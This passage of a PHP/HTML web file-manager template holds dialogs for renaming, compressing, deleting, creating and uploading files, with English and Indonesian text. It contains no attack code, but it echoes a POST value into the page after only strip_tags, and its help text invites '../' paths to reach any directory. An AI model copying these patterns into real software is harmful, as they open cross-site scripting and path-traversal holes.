		<div style="float:left; width:500px;">Rename <span id="vpb_this_directory_rename"></span></div>
		<div style="float:right;" align="right"><a href="javascript:void(0);" class="vpb_general_button_red" style="padding:3px;padding-top:2px;padding-left:7px;padding-right:7px;" onClick="vpb_hide_popup_options_boxes();">x</a></div><br clear="all">
		</div><br clear="all">
		<div align="left" style="font-family:Verdana, Geneva, sans-serif; font-size:11px;width:550px;">To rename the above file/directory, please type the new name that you wish to give to the file/directory in the field specified below.<br /></div><br clear="all">
		
		<div style="width:550px;float:left;" align="left">
		<b>NOTE:</b> You can rename a file or directory from the current directory to any level (<b>Up</b> or <b>Down</b>) provided you enter the correct path to the directory where you want the renamed item to be.<br /><br />Be informed that the current file will be deleted after it has been renamed. It doesn't matter the path to where the renamed item was sent.<br /><br />
		
		Below is an example of how to rename a file or directory from the current directory to one step <b>UP</b> and one step <b>DOWN</b><br /><br />
		<b>One step up</b> = <?php echo strip_tags($_POST['vpb_current_directory_identifier']).'/'.$vpb_dir_partitions; ?>your-existing-folder-name/new-file-or-folder-name<br /><br />
		<b>One step down</b> = <?php echo strip_tags($_POST['vpb_current_directory_identifier']).'/'.$vpb_dir_partitions; ?>../new-file-or-folder-name<br /><br />
		</div><br clear="all">
		
		<div style="width:550px;float:left;" align="left"><b>Current directory:</b> <?php echo strip_tags($_POST['vpb_current_directory_identifier']).'/'.$vpb_dir_partitions; ?></div>
		<br clear="all"><br clear="all">
		<div style="width:155px; padding-top:9px;float:left;" align="left">&nbsp;</div>
		<div id="vpb_processing_rename_action" style="width:385px;float:left;" align="left"></div><br clear="all" />
		<div style="width:155px; padding-top:9px;float:left;" align="left"><b>Rename to:</b> <?php echo strip_tags($_POST['vpb_current_directory_identifier']); ?>/</div>
		<div style="width:380px;float:left;" align="left"><input type="text" id="vpb_to_this_directory_rename" name="vpb_to_this_directory_rename" value="" class="vpb_textAreaBoxInputs" style="width:380px;"></div><br clear="all"><br clear="all">
		<div style="width:155px; padding-top:9px;float:left;" align="left">&nbsp;</div>
		<div style="float:left;" align="left">
		<a href="javascript:void(0);" class="vpb_general_button" onClick="vpb_directory_action_submission('rename');">Submit</a><br clear="all" /></div></div>
		<!-- Compress Directory Pop-up Box -->
		<div id="directory_box_compress" style="display:none;">
		<div align="left" style="font-family:Verdana, Geneva, sans-serif; font-size:13px; font-weight:bold;word-wrap: break-word;">
		<div style="float:left; width:500px;">Compress <span id="vpb_this_directory_compress"></span></div>
		<div style="float:right;" align="right"><a href="javascript:void(0);" class="vpb_general_button_red" style="padding:3px;padding-top:2px;padding-left:7px;padding-right:7px;" onClick="vpb_hide_popup_options_boxes();">x</a></div><br clear="all">
		</div><br clear="all">
		<div align="left" style="font-family:Verdana, Geneva, sans-serif; font-size:11px;">To compress the above file/directory, please comfirm that the file/directory name below is your desired name and then click on the submit button.<br /></div><br clear="all">
		<div style="width:550px;float:left;" align="left">
		<b>NOTE:</b> You can compress or zip a file or directory from the current directory to any level (<b>Up</b> or <b>Down</b>) provided you enter the correct path to the directory where you want the compressed or zipped item to be.<br /><br />
		Below is an example of how to compress or zip a file or directory from the current directory to one step <b>UP</b> and one step <b>DOWN</b><br /><br />
		<b>One step up</b> = <?php echo strip_tags($_POST['vpb_current_directory_identifier']).'/'.$vpb_dir_partitions; ?>your-existing-folder-name/new-file-or-folder-name.zip<br /><br />
		<b>One step down</b> = <?php echo strip_tags($_POST['vpb_current_directory_identifier']).'/'.$vpb_dir_partitions; ?>../new-file-or-folder-name.zip<br /><br />
		</div><br clear="all">
		<div style="width:550px;float:left;" align="left"><b>Current directory:</b> <?php echo strip_tags($_POST['vpb_current_directory_identifier']).'/'.$vpb_dir_partitions; ?></div>
		<br clear="all"><br clear="all">
		<div style="width:165px; padding-top:9px;float:left;" align="left">&nbsp;</div>
		<div id="vpb_processing_compress_action" style="width:370px;float:left;" align="left"></div><br clear="all" />
		<div style="width:165px; padding-top:9px;float:left;" align="left"><b>Compress to:</b> <?php echo strip_tags($_POST['vpb_current_directory_identifier']); ?>/</div>
		<div style="width:370px;float:left;" align="left"><input type="text" id="vpb_to_this_directory_compress" name="vpb_to_this_directory_compress" value="" class="vpb_textAreaBoxInputs" style="width:370px;"></div><br clear="all"><br clear="all">
		<div style="width:165px; padding-top:9px;float:left;" align="left">&nbsp;</div>
		<div style="float:left;" align="left">
		<a href="javascript:void(0);" class="vpb_general_button" onClick="vpb_directory_action_submission('compress');">Submit</a><br clear="all" />
		</div>
		</div>
		<!-- Delete Directory Pop-up Box -->
		<div id="directory_box_delete" style="display:none;">
		<div align="left" style="font-family:Verdana, Geneva, sans-serif; font-size:13px; font-weight:bold;word-wrap: break-word;">
		<div style="float:left; width:500px;">Delete <span id="vpb_this_directory_delete"></span></div>
		<div style="float:right;" align="right"><a href="javascript:void(0);" class="vpb_general_button_red" style="padding:3px;padding-top:2px;padding-left:7px;padding-right:7px;" onClick="vpb_hide_popup_options_boxes();">x</a></div><br clear="all">
		</div><br clear="all">
		<div id="vpb_processing_delete_action" style="min-width:300px;float:left;" align="left"></div><br clear="all" />
		<div align="left" style="font-family:Verdana, Geneva, sans-serif; font-size:11px;" class="info">Are you sure that you really want to delete <b><span id="directory_to_delete_name"></span></b>?</div><br clear="all"><br clear="all">
		<div style="float:left;" align="left">
		<a href="javascript:void(0);" class="vpb_general_button" onClick="vpb_directory_action_submission('delete');">Yes</a>
		<a href="javascript:void(0);" class="vpb_general_button" onClick="vpb_hide_popup_options_boxes();">Cancel</a><br clear="all" /></div></div><div id="directory_box">
		<div align="left" style="font-family:Verdana, Geneva, sans-serif; font-size:13px; font-weight:bold;word-wrap: break-word;">
		<div style="float:left; width:500px;"><span id="vpb_options_for_this_directory"></span></div>
		<div style="float:right;" align="right"><a href="javascript:void(0);" class="vpb_general_button_red" style="padding:3px;padding-top:2px;padding-left:7px;padding-right:7px;" onClick="vpb_hide_popup_options_boxes();">x</a></div><br clear="all">
		</div><br clear="all">
		<?php 
		if (@$_SESSION['admin']) { ?>
		<div align="left" style="font-family:Verdana, Geneva, sans-serif; font-size:11px;">Silakan klik opsi pilihan Anda atau tindakan yang ingin Anda lakukan pada file atau direktori di atas.</div> <?php } ?>
		<br clear="all"><br clear="all">
		<div style="float:left;" align="left">
		<input type="hidden" id="vpb_directory_or_file_name" value="" />
		<input type="hidden" id="directory_or_file_to_delete_name" value="" />
		<?php
		if(@$_SESSION['admin']) { ?>
		<a href="javascript:void(0);" class="vpb_general_button" onClick="vpb_directory_action('move');">Move</a>
		<a href="javascript:void(0);" class="vpb_general_button" onClick="vpb_directory_action('copy');">Copy</a>
		<a href="javascript:void(0);" class="vpb_general_button" onClick="vpb_directory_action('rename');">Rename</a>
		<a href="javascript:void(0);" class="vpb_general_button" onClick="vpb_directory_action('compress');">Compress</a>
		<a href="javascript:void(0);" class="vpb_general_button" onClick="vpb_directory_action('delete');">Delete</a><br clear="all" /></div></div>
		<?php
		} else {
			echo "Anda tidak punya hak akses untuk halaman ini !! <br> Silahkan untuk pilih opsi yang lain.";
		} ?>
		<!-- Create New Directory or File Pop-up Box -->
		<?php
		if(@$_SESSION['admin']) { ?>
		<div id="directory_box_create_new_file_or_directory" style="display:none;">
		<div align="left" style="font-family:Verdana, Geneva, sans-serif; font-size:13px; font-weight:bold;word-wrap: break-word;">
		<div style="float:left; width:500px;">Membuat Baru <span id="vpb_this_directory_or_file"></span></div>
		<div style="float:right;" align="right"><a href="javascript:void(0);" class="vpb_general_button_red" style="padding:3px;padding-top:2px;padding-left:7px;padding-right:7px;" onClick="vpb_hide_popup_options_boxes();">x</a></div><br clear="all">
		<?php } ?>
        <script type="text/javascript" src="default_system_files/base64.js"></script>
		</div><br clear="all">
		<?php
		if(@$_SESSION['admin']) { ?>
		<div align="left" style="font-family:Arial, Geneva, sans-serif; font-size:12px;">Untuk membuat yang baru <span id="file_or_dir"></span>,silakan ketik nama baru di ruang yang disediakan di bawah ini atau cukup navigasikan ke direktori tempat Anda ingin membuat file atau direktori baru Anda dan ketik file atau nama direktori yang Anda inginkan di tempat yang disediakan kemudian klik tombol kirim.<br /></div><br clear="all">
		<div style="width:550px;float:left;" align="left">
		<b>CATATAN:</b> Anda dapat membuat file atau direktori baru dari direktori saat ini ke level apa pun (<b>Naik</b> Atau <b>Bawah</b>) asalkan Anda memasukkan jalur yang benar ke direktori tempat Anda ingin file atau direktori yang baru dibuat.<br /><br />
		Di bawah ini adalah contoh cara membuat file atau direktori baru dari direktori saat ini ke satu langkah <b>Naik</b> dan satu tahap <b>Bawah</b><br /><br />
		<b>Satu langkah ke atas</b> = <?php echo strip_tags($_POST['vpb_current_directory_identifier']).'/'.$vpb_dir_partitions; ?>your-existing-folder-name/new-file-or-folder-name<br /><br />
		<b>Satu langkah ke bawah</b> = <?php echo strip_tags($_POST['vpb_current_directory_identifier']).'/'.$vpb_dir_partitions; ?>../new-file-or-folder-name<br /><br />
		</div><br clear="all">
		<div style="width:550px;float:left;" align="left"><b>Dikrektori Saat ini:</b> <?php echo strip_tags($_POST['vpb_current_directory_identifier']).'/'.$vpb_dir_partitions; ?></div>
		<br clear="all"><br clear="all">
		<div style="width:145px; padding-top:9px;float:left;" align="left">&nbsp;</div>
		<div id="vpb_processing_create_action" style="width:394px;float:left;" align="left"></div><br clear="all" />
		<div style="width:145px; padding-top:9px;float:left;" align="left"><b>Buat Untuk:</b> <?php echo strip_tags($_POST['vpb_current_directory_identifier']); ?>/</div>
		<div style="width:390px;float:left;" align="left"><input type="text" id="vpb_to_this_directory_create" name="vpb_to_this_directory_create" value="" class="vpb_textAreaBoxInputs" style="width:390px;"></div><br clear="all"><br clear="all">
		<div style="width:145px; padding-top:9px;float:left;" align="left">&nbsp;</div>
		<div style="float:left;" align="left">
		<a href="javascript:void(0);" class="vpb_general_button" onClick="vpb_directory_action_submission('create');"> <i class="fa fa-plane-o"> Simpan</i></a><br clear="all" />
		</div>
		<?php } ?>
		</div>
		<!-- Upload Files Pop-up Box -->
		<div id="vpb_upload_files" style="display:none;">
		<div align="left" style="font-family:Verdana, Geneva, sans-serif; font-size:13px; font-weight:bold;word-wrap: break-word;">
		<?php
		if (@$_SESSION['admin'] || @$_SESSION['operator']) { ?>
			
		<div style="float:left; width:500px;">Unggah berkas</div>
		<div style="float:right;" align="right"><a href="javascript:void(0);" class="vpb_general_button_red" style="padding:3px;padding-top:2px;padding-left:7px;padding-right:7px;" onClick="vpb_hide_popup_options_boxes();">x</a></div><br clear="all">
		</div><br clear="all">
		<div align="left" style="font-family:Verdana, Geneva, sans-serif; font-size:11px; line-height:18px;">To upload a new file, simply navigate to the directory where you want to upload the file and click on the Browse File button below to upload your file(s) automatically into that directory.<br /><br />
		<b>Note:</b> All compressed or zipped files uploaded will be extracted upon successful upload.<br />
		</div><br clear="all">
		<div style="width:426px;float:left;" align="left"><b>Current Directory:</b> <?php echo strip_tags($_POST['vpb_current_directory_identifier']).'/'.$vpb_dir_partitions; ?>Uploaded-files-will-be-here</div>
		<br clear="all"><br clear="all"><br clear="all">
		<center><div id="vpb_upload_status" style="max-width:550px; width:auto;" align="center"></div></center><br clear="all" />
		<center><div style="width:135px;float:;" align="center">
		<form id="vpb_file_attachment_form" method="post" enctype="multipart/form-data" action="javascript:void(0);" autocomplete="off">
		<span class="vpb_browse_file_box" id="main_b"><input type="file" name="vpb_browsed_file" id="vpb_browsed_file" class="vpb_file_browsing_field"></span>
		</form>
		<span class="vpb_browse_file_box" id="fake_b" style="display:none;"><input disabled="disabled" type="file" name="" id="" class="vpb_file_browsing_field"></span> 
		</div></center>
		</div>
		<br clear="all"><br clear="all">
		</div>
	<?php } else {
		echo "Anda tidak punya hak akses halaman ini !! <br> Silahkan untuk pilih opsi yang lain.";
	} ?>
        <script type="text/javascript">
		//This function is called automatically when you click outside the pop-up box to exit pop-ups
		$(document).ready(function() 
		{	
			$("#vpb_file_system_background").click(function()
			{
				$("#vpb_directory_options_box").hide(); //Hides the directory option box when clicked outside the form
				$("#vpb_file_options_box").hide(); //Hides the file option box when clicked outside the form
				$("#directory_box_create_new_file_or_directory").hide();
				$("#vpb_upload_status").hide();
				$("#vpb_upload_files").hide();
				$("#vpb_file_system_background").fadeOut("slow");
			});
			//Fake uploads button opacity
			$("#fake_b").css({
				"opacity": "0.7"
			});
			$("#file_system_search").Watermark("Search files");
		});
		</script>
		<!-- Directory Pop-up Boxes Ends Here -->
		</div>
		<?php
	}
	else
	{
		echo '<div class="info">Sorry, the page you were trying to access could not be verified at the moment. Please try again or contact the site developer to report the error if this problem persist. Thanks...</div><br clear="all">';
	}
}
?>